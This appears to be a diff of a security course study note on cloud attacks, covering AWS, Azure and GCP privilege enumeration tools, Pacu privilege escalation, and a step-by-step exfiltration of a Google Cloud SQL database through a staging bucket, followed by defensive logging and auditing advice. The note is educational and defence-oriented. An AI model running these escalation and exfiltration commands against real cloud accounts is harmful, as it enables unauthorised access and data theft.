+While attackers can run reconnaissance commands manually, WeirdAAL automates AWS privilege enumeration and cloud asset discovery. It enumerates AWS access privileges using available functions or brute-forces access attempts for known permissions to discover opportunities.
+:::
 
-### AzureStealth:
+It's noisy if CloudTrail failed-access logging is enabled. Get all available modules:
 
-this can be used for Azure but unlike the WeirdAAL this doesn't have an privilege enumeration/ attack capabilities , all this dose it to scan for shadow admin, a shadow admin account is a an account with administrative capabilities without being expressly authorized as an administrator, this can be an attacker crating a backdoor to avoid detection , or a misconfiguration.  so to start using it u will first need to download the script form GitHub then in PowerShell you will have to import the script `Import-Module .\AzureStealth.ps1 -Force`, and now your ready to use all you have to do is run the `Scan-AzureAdmins` command , after the command finishes the results will be saved in a zip file which contain CSV files containing Azure domains list of all enumerated users and a list of admin accounts including the shadow admins.  though this is not designed as an attack tool and intended to be used by defenders , attacker can still lavage it to gather info about the victim.
+```bash title="List WeirdAAL modules"
+python3 weirdAAL.py -l
+```
 
-### GCP Enumerate Permissions:
+Run the `recon_all` module for comprehensive reconnaissance:
 
-for Google Compute environments, well be using the enumerate_member_permissions.py from rhinolabs, after we login using `gcloud auth login` 
-and get the access token `gcloud auth print-access-token`then run the script feeding it the project name `./enumerate_member_permissions.py -p cryptic-woods-298720`,the script will then ask for an access token to brute-force available permissions, saving the results to a JSON file. 
+```bash title="Run WeirdAAL reconnaissance"
+python3 weirdAAL.py -m recon_all
+```
 
-### Privilege Escalation Attacks:
+### AzureStealth
 
-after logging in with the stolen data attackers then aim to escalate there privilege to gain root access for example in AWS if a help disk account have the  `iam:PutUserPolicy`which helps them to grant access to specific assets, this can be abused as you can grant any one root level access to anything. attacker goal is to enumerate all privileges , and identify opportunities to gain escalated access to cloud resources. This may include cloud-provider policies, but it could also be enumerating custom policies and the potential to abuse them.
+Unlike WeirdAAL, AzureStealth focuses on finding shadow admin accounts — accounts with administrative capabilities without being explicitly authorized. First, import the module in PowerShell:
+
+```bash title="Import AzureStealth module"
+Import-Module .\AzureStealth.ps1 -Force
+```
+
+Scan for shadow admins:
+
+```bash title="Scan for shadow admin accounts"
+Scan-AzureAdmins
+```
+
+Results are saved in a ZIP file containing CSV files with Azure domains, enumerated users, and shadow admin accounts.
+
+### GCP Enumerate Permissions
+
+For Google Compute environments, use `enumerate_member_permissions.py` from Rhino Labs. First, authenticate and get an access token:
+
+```bash title="Authenticate with Google Cloud"
+gcloud auth login
+```
+
+```bash title="Get Google Cloud access token"
+gcloud auth print-access-token
+```
+
+Run the script against a project:
+
+```bash title="Enumerate GCP permissions"
+./enumerate_member_permissions.py -p cryptic-woods-298720
+```
+
+The script brute-forces available permissions and saves results to JSON.
+
+### Privilege Escalation Attacks
+
+After logging in with stolen credentials, attackers aim to escalate privileges to gain root access. For example, in AWS, if a help desk account has `iam:PutUserPolicy`, they can grant anyone root-level access. The goal is to enumerate all privileges and identify escalation opportunities.
 
 ### Pacu: AWS Interrogation and Attack Framework
 
-is an AWS interrogation and attack framework later expanded to include Azure and Google Compute platforms , its a modular collection of exploits privilege escalation attacks and data exfiltration functionalities, two useful modules for privilege escalation are `iam__enum_permissions`and `iam__privesc_scan`,
+:::tip
+Pacu is an AWS interrogation and attack framework (later expanded to Azure and Google Cloud) with modular exploits, privilege escalation attacks, and data exfiltration capabilities. Useful modules include `iam__enum_permissions` and `iam__privesc_scan`.
+:::
 
-to start Pacu you will run the cli.py script, then import the keys for an AWS user by specifying the profile name, Pacu will read it form the default location for the AWS credentials file for the host OS, then enumerate the current key by running `iam__enum_permissions`,then it will access and exploit ant AMI policy weaknesses by running`iam__privesc_scan`,lets say it finds a policy with `PutUserPolicy`privileges and leverages it to automatically create a new inline policy that grants the user administrator access to the cloud environment.
+Start Pacu:
 
-after privilege escalation attackers gets access to more data resources, This could include cloud storage resources (AWS S3 buckets, Azure containers, GCP buckets, etc.), database instances, or key storage services. also cloud VMs, backups and snapshots. once an attacker escalates their privileges to cloud admin they can access ,content in Google Drive, OneDrive, or email resources. While some resources may be available for direct download, other resources (such as VM snapshots, serverless functions, and key storage services) may require intermediate storage transfer to a bucket, then retrieval from the intermediate storage to the attacker. this will create a better opportunity for defenders to detect such a thing. just like any attacker the data is there final goal 
+```bash title="Run Pacu CLI"
+python3 cli.py
+```
 
-now lets take a look at steps an attacker takes to obtain data from a Google Compute Cloud SQL target:
+Import AWS credentials by profile name, then enumerate:
 
-1. Using privileged access, the attacker identifies database instance targets by running `gcloud sql instances list`; lets say we got an output of a database named `fm-research`
-2. Next the attacker enumerates the database schemas by repeating the command, adding `-i fm-research` to specify the target database instance
-3.  The attacker can't download the database directly, so he creates an intermediate bucket, using this command `gsutil mb gs://sqlexfil` 
-4. Next the attacker grants the current user write access to the new bucket using this `gsutil acl ch -u jmerckle@falsimentis.com:WRITE gs://sqlexfil`command
-5. With the intermediate storage device and the permissions applied, the attacker can export the database instance `fm-research` and the database schema `ai` , `gcloud sql export sql fm-research --database=ai gs://sqlexfil/sqldump.gz`
-6.  Once the backup completes, the attacker can download the database backup using `gsutil cp gs://sqlexfil/sqldump.gz .`
+```bash title="Enumerate IAM permissions with Pacu"
+run iam__enum_permissions
+```
 
-and as we saw the attacker did not use any external attack tool he only used official tools by google, for defenders we can spot this kind of attacks just by using Google’s cloud audit logs.
+Scan for privilege escalation opportunities:
 
-### Microsoft 365 Compliance Search:
+```bash title="Scan for IAM privilege escalation"
+run iam__privesc_scan
+```
 
-if attackers can escalate there privilege to  eDiscovery Manager role (Administrator, compliance officer, or eDiscover manager groups), they can access the data compliance search in O365, which is a feature for auditors to review and report data handling in an organization, this is a super powerful tool as it allows you access to all O365  resources: Outlook, Teams, Skype, SharePoint, OneDrive, etc. attackers can use key words search for files name and type and email keywords. in google there is Google takeout which is similar to this.
+Pacu can automatically identify and exploit policy weaknesses — for example, finding `PutUserPolicy` privileges and using them to create an inline policy granting administrator access.
 
-### Defenses:
+After escalation, attackers access cloud storage (S3 buckets, Azure containers, GCP buckets), databases, key storage services, VMs, backups, and snapshots. From admin access, they can also access Google Drive, OneDrive, or email resources. Some resources allow direct download; others (VM snapshots, serverless functions, key storage) require intermediate storage transfer to a bucket, then retrieval — which creates detection opportunities for defenders.
 
-three things to defend correctly 
+**Example: Exfiltrating a Google Cloud SQL Database**
 
-**Understand Your Infrastructure:** What are the cloud assets? How are user permissions allocated? What are the policies?
+1. Identify database targets:
+```bash title="List GCP SQL instances"
+gcloud sql instances list
+```
 
-**Audit Permissions and Policies:** Are policies sufficiently restrictive? Do users have limited access? Is the Principle of Least Privilege (POLP) sufficiently employed?
+2. Enumerate schemas for target database `fm-research`:
+```bash title="Describe GCP SQL instance"
+gcloud sql instances describe fm-research
+```
+
+3. Create an intermediate bucket:
+```bash title="Create GCP storage bucket"
+gsutil mb gs://sqlexfil
+```
+
+4. Grant write access:
+```bash title="Grant bucket write access"
+gsutil acl ch -u jmerckle@falsimentis.com:WRITE gs://sqlexfil
+```
+
+5. Export the database:
+```bash title="Export SQL database to GCP bucket"
+gcloud sql export sql fm-research --database=ai gs://sqlexfil/sqldump.gz
+```
+
+6. Download the backup:
+```bash title="Download database backup"
+gsutil cp gs://sqlexfil/sqldump.gz .
+```
+
+:::note
+The attacker uses only official Google tools, making detection more difficult. Defenders can identify such attacks using Google Cloud audit logs.
+:::
+
+### Microsoft 365 Compliance Search
+
+If attackers escalate to the eDiscovery Manager role (Administrator, compliance officer, or eDiscovery manager groups), they can access O365 compliance search — a feature for auditors to review data handling. This grants access to all O365 resources: Outlook, Teams, Skype, SharePoint, OneDrive, etc. Attackers can search by file name, type, and email keywords.
+
+Google offers similar functionality through Google Takeout.
+
+### Defenses
+
+Three key defensive principles:
+
+**Understand Your Infrastructure:** What cloud assets exist? How are permissions allocated? What policies govern access?
+
+**Audit Permissions and Policies:** Are policies sufficiently restrictive? Do users have limited access? Is the Principle of Least Privilege (POLP) applied?
 
 **Verify and Monitor Asset Logging:** Are access and change events logged and monitored to detect unauthorized use?
 
-some tools to help with this are: 
+**Recommended Tools:**
 
-**AWS: CloudMapper** 
+**AWS: CloudMapper** — an open-source visualization and auditing tool. Requires credentials with at least `job-function/ViewOnlyAccess` and a JSON config file.
 
-an open source visualizing tool for AWS and auditing it , to use it you need an account with at least the `job-function/ViewOnlyAccess`privileges, it also require a JSON config file that defines the environment name, AWS account ID, a list of network numbers, then the cloudmapper.py script will take this file and the account name and start to do its magic. 
+**Azure: AzViz** — an open-source PowerShell module for enumerating and visualizing Azure deployments.
 
-For Azure, the open-source AzViz tool is a PowerShell module to enumerate and visualize Azure cloud deployments,  and For Google Compute environments, the Google Network Topology tool can visualize the topology of Virtual Private Cloud (VPC) environments.
+**Google Cloud: Network Topology tool** — visualizes VPC topology.
 
-**ScoutSuite (AWS, GCP, Azure):**
+**ScoutSuite (AWS, GCP, Azure)** — a dedicated vulnerability assessment tool for cloud environments. Generates HTML and JSON reports; premium versions include additional scanning features.
 
-this is a dedicated vulnerability assessment tool for cloud environments, it uses privileged access to preform comprehensive vulnerability assessment, it generates a HTML report and a JSON report.  it supports rules for identifying cloud vulnerabilities in the free toll, the premium includes additional scanning functionalities.
+**Cloud Logging Best Practices:**
 
-**Cloud Logging:**
+Store logs in a bucket owned by a separate cloud account. Use a write-only bucket — attackers with high privileges can alter locally-stored logs. Cloud logging should include:
 
-how to setup the logging is platform and organization specific, things to keep in mind you should always keep your logging data in a storage bucket owned by a different cloud account, use a write only bucket as an attacker with high privilege can alter the logs if stored locally. 
+- Netflow-style logs (source/destination, port, protocol, packet count, byte count, start/finish time)
+- Cloud storage access logs (timestamp, requester IP, action, response, data size)
+- All API access attempts for sensitive resources
+- Failed API request messages for non-sensitive resources
 
-Cloud logging should include:
+Use cloud-native monitoring: Amazon Detective, Azure Sentinel, and GCP Security Command Center integrate with their logging data for threat hunting and incident response.
 
-- Netflow-style logs to and from cloud endpoints (source and destination, port, protocol, packet count, byte count, start time, finish time)
-- Cloud storage access logs (timestamp, requester IP, action, response, response data size)
-- All API access attempts for sensitive resources (with status response)
-- API request failed messages for non-sensitive resources
+Retain logs for 30–90 days, using inexpensive storage like Amazon Glacier, Azure Archive/Cool Storage, or Google Cloud Storage Archive.
 
-use your cloud provider tool for monitoring, Amazon Detective, Azure Sentinel, and GCP Security Command Center all offer valuable features that are designed to work specifically with their logging data which will help with threat hunting and incident response analysis.
+![image.png](./Sec_504_book5/image_14.png)
 
-and retaining the data for a window between 30-90 days , also consider using inexpensive storage like Amazon Glacier, Azure Archive/Azure Cool Storage, or Google Cloud Storage Archive. 
-
-![image.png](././Sec_504_book5/image_14.png)
-
-**done الحمدلله**
+**الحمد لله done**
